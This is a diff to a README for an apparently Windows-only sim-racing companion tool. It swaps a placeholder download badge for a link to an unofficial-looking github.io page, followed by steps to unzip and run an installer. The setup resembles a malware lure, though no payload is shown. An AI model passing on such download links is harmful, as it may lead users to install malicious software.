@@ -8,7 +8,7 @@ Compatible with leading sim racing titles like **iRacing, Assetto Corsa, Project
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://crew-chief-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
